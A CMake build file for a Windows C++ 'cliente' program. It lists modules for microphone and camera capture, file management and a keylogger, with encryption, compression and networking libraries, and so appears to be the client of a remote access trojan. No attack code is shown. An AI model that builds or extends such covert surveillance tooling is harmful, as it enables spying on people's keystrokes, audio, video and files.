cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(cliente LANGUAGES CXX C)
 
set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
#set(CMAKE_CXX_FLAGS "-fsanitize=address")
#set(CMAKE_EXE_LINKER_FLAGS " -static")
#set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-gcc )
#set(CMAKE_CXX_FLAGS "-Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic " )

#set(CMAKE_BUILD_TYPE Debug)

set(SRCS main.cpp
         misc.cpp
         cliente.cpp 
         mod_mic.cpp
         mod_camara.cpp
         mod_file_manager.cpp
         mod_keylogger.cpp
         mod_mic.cpp
         ../aes256/aes256.cpp
         ../lzo/minilzo.c)

#set_target_properties(cliente PROPERTIES LINK_FLAGS "/SUBSYSTEM:CONSOLE")

add_executable(cliente ${SRCS})
target_link_libraries(cliente PRIVATE netapi32 wsock32 ws2_32 mf mfplat mfreadwrite mfuuid wmcodecdspuuid ole32 strmiids uuid winmm wtsapi32 gdi32 gdiplus shlwapi)
